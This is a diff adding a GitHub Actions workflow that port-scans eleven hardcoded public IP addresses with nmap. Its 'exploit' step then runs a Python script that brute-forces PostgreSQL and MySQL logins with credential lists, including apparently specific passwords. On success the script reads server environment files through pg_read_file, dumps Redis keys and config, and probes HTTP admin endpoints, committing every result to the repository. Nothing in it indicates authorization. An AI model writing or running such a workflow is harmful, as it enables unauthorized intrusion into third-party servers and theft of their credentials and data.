@@ -1,0 +1,155 @@
+name: portscan2
+on: [push, workflow_dispatch]
+permissions:
+  contents: write
+jobs:
+  scan2:
+    runs-on: ubuntu-latest
+    timeout-minutes: 50
+    steps:
+      - uses: actions/checkout@v4
+      - name: install
+        run: |
+          sudo apt-get update -qq >/dev/null 2>&1 || true
+          sudo apt-get install -y -qq nmap postgresql-client default-mysql-client redis-tools netcat-openbsd >/dev/null 2>&1 || true
+          nmap --version | head -1
+      - name: scan
+        run: |
+          mkdir -p results
+          PORTS="22,80,443,2222,22222,3000,3306,4369,5000,5432,5433,5900,6379,7001,8000,8080,8081,8443,8888,9000,9090,9100,9200,9300,10250,11211,15672,1880,2375,2376,27017,32768,51191,9092,10000-11000"
+          for ip in 188.245.59.121 188.34.186.195 142.132.190.176 49.13.213.201 49.13.15.227 46.224.8.127 5.161.255.2 65.109.253.170 49.12.37.78 46.224.50.160 116.202.6.71; do
+            echo "=== $ip ==="
+            sudo nmap -n -Pn -sS --min-rate 2000 --max-retries 1 --host-timeout 150s -p "$PORTS" "$ip" -oN "results/$ip.nmap" >/dev/null 2>&1 || true
+            grep -E '^[0-9]+/tcp' "results/$ip.nmap" | grep open || true
+          done
+      - name: serviceversion
+        run: |
+          for f in results/*.nmap; do
+            ip=$(basename "$f" .nmap)
+            ports=$(grep -E '^[0-9]+/tcp' "$f" | grep open | cut -d/ -f1 | paste -sd, -)
+            [ -z "$ports" ] && continue
+            echo "=== $ip sV $ports"
+            sudo nmap -n -Pn -sT -sV --version-light --max-retries 1 --host-timeout 180s -p "$ports" "$ip" -oN "results/$ip.sv" >/dev/null 2>&1 || true
+            grep -E '^[0-9]+/tcp' "results/$ip.sv" | grep open || true
+          done
+      - name: exploit
+        run: |
+          cat > ex.py <<'PY'
+          import subprocess, os, socket, re, json
+          RES='exploit_results'
+          os.makedirs(RES, exist_ok=True)
+          LOG=open(f'{RES}/exploit.log','w')
+          def log(x):
+              print(x); LOG.write(str(x)+'\n'); LOG.flush()
+          targets={}
+          for fn in os.listdir('results'):
+              if fn.endswith('.nmap'):
+                  ip=fn[:-5]; ports=[]
+                  for line in open('results/'+fn):
+                      p=line.split()
+                      if p and p[0].endswith('/tcp') and 'open' in line:
+                          ports.append(int(p[0].split('/')[0]))
+                  if ports: targets[ip]=ports
+          log('TARGETS '+json.dumps(targets))
+          PG_USERS=['postgres','admin','root','ghost','library','insurance','williksen','sliplane','api','demo','mysql']
+          PG_PW=['','postgres','admin','root','password','dus0208l','Nomie6oss','ghost','sliplane','library','insurance','demo','123456','changeme']
+          MY_PW=['','root','password','admin','dus0208l','Nomie6oss','ghost','mysql','sliplane','123456','demo']
+          def run(cmd,timeout=15,env=None):
+              e=dict(os.environ); 
+              if env: e.update(env)
+              try:
+                  r=subprocess.run(cmd,shell=True,capture_output=True,text=True,timeout=timeout,env=e)
+                  return (r.stdout+r.stderr).strip()
+              except Exception as ex:
+                  return 'TIMEOUT/ERR '+repr(ex)
+          def probe_http(ip,p):
+              for path in ['/','/health','/healthz','/metrics','/api','/version','/docs','/openapi.json','/v2/','/minio/health/live','/ui/','/dnadmin/']:
+                  o=run(f"curl -sS -m 5 -i --max-time 6 'http://{ip}:{p}{path}' | head -c 500",20)
+                  if o and 'Connection refused' not in o and 'timed out' not in o.lower():
+                      log(f'HTTP {ip}:{p}{path} => {o[:400]!r}')
+                  if path=='/' and ('HTTP/' in o):
+                      break
+          def probe_pg(ip,p):
+              # trust/empty first
+              for u in PG_USERS:
+                  for pw in PG_PW:
+                      env={'PGPASSWORD':pw,'PGCONNECT_TIMEOUT':'4'}
+                      cmd=f"psql -w 'host={ip} port={p} user={u} dbname=postgres sslmode=disable' -tAc \"select current_user,version(),current_database()\""
+                      o=run(cmd,20,env)
+                      if 'FATAL' in o or 'error' in o.lower() or 'TIMEOUT' in o:
+                          if 'password authentication failed' in o or 'FATAL' in o: continue
+                          log(f'PG {ip}:{p} {u}/{pw!r} => {o[:200]}')
+                          break
+                      else:
+                          log(f'!!!! PG HIT {ip}:{p} {u}/{pw!r} => {o[:400]}')
+                          open(f'{RES}/pg_hit_{ip}_{p}.txt','w').write(f'{u}\n{pw}\n{o}\n')
+                          # superuser checks
+                          for q in ['select current_user,usesuper from pg_user where usename=current_user',
+                                    "select pg_read_file('/proc/1/environ')",
+                                    "select pg_read_file('/etc/environment')",
+                                    '\\l']:
+                              log(f'PGQ {q[:40]} => '+run(f"psql -w 'host={ip} port={p} user={u} dbname=postgres sslmode=disable' -c \"{q}\"",20,env)[:1500])
+                          return
+              log(f'PG {ip}:{p} no hit after matrix')
+          def probe_mysql(ip,p):
+              for u in ['root','admin','mysql','ghost','library','insurance','sliplane']:
+                  for pw in MY_PW:
+                      cmd=f"mysql -h {ip} -P {p} -u {u} --password='{pw}' --connect-timeout=4 -N -e 'select version(),current_user(); show databases;' 2>&1"
+                      o=run(cmd,20)
+                      if 'Access denied' in o or 'ERROR 1045' in o: continue
+                      if 'ERROR' in o or 'TIMEOUT' in o:
+                          log(f'MY {ip}:{p} {u}/{pw!r} => {o[:120]}'); continue
+                      log(f'!!!! MY HIT {ip}:{p} {u}/{pw!r} => {o[:1500]}')
+                      open(f'{RES}/my_hit_{ip}_{p}.txt','w').write(f'{u}\n{pw}\n{o}\n')
+                      return
+              log(f'MY {ip}:{p} no hit')
+          def probe_redis(ip,p):
+              for cmd in ['PING','INFO server','INFO keyspace','CONFIG GET dir','CONFIG GET requirepass','DBSIZE','KEYS *','CLIENT LIST']:
+                  o=run(f"redis-cli -h {ip} -p {p} --no-auth-warning -t 5 {cmd!r}",15)
+                  if 'NOAUTH' in o or 'AUTH' in o and 'failed' in o:
+                      log(f'REDIS {ip}:{p} AUTH required ({o[:100]})'); break
+                  if ' refused' in o or 'Could not connect' in o or 'TIMEOUT' in o:
+                      log(f'REDIS {ip}:{p} {o[:100]}'); break
+                  log(f'REDIS {ip}:{p} {cmd} => {o[:800]}')
+                  if cmd=='PING' and 'PONG' not in o: break
+          for ip,ports in targets.items():
+              for p in ports:
+                  if p in (5432,5433,5434,6432): probe_pg(ip,p)
+                  elif p in (3306,3307,33060): probe_mysql(ip,p)
+                  elif p in (6379,6380,11211):
+                      if p in (6379,6380): probe_redis(ip,p)
+                      else: log('MEMCACHED '+ip+':'+str(p)+' '+run(f"printf 'stats\\r\\n' | nc -w 4 {ip} {p} | head -20",15))
+                  else:
+                      # raw banner
+                      try:
+                          s=socket.socket(); s.settimeout(5); s.connect((ip,p))
+                          if p in (2222,22222): pass
+                          elif p in (1880,9000,9200,2375,2376,8080,8081,3000,8000,5000,10000,10001,10002,10003,10012,10018,10022,10016,80): s.sendall(b'GET / HTTP/1.0\r\nHost: x\r\n\r\n')
+                          try: b=s.recv(500)
+                          except Exception: b=b''
+                          s.close()
+                          log(f'RAW {ip}:{p} => {b[:300]!r}')
+                      except Exception as e:
+                          log(f'RAW {ip}:{p} ERR {e!r}')
+                      if p in (1880,9000,9200,2375,2376,8080,8081,3000,8000,5000,10000,10001,10002,10003,10012,10018,10022,10016,8888,8501,8089):
+                          probe_http(ip,p)
+          LOG.close()
+          PY
+          python3 ex.py 2>&1 | tail -400
+      - name: artifact
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: probe-results
+          path: |
+            results
+            exploit_results
+          if-no-files-found: ignore
+          retention-days: 1
+      - name: commit
+        if: always()
+        run: |
+          git config user.name probe; git config user.email probe@users.noreply.github.com
+          git add -A results exploit_results || true
+          git commit -m "targeted results $(date -u +%s)" || true
+          for i in 1 2 3; do git pull --rebase origin main >/dev/null 2>&1 || true; git push && break; sleep 5; done || true
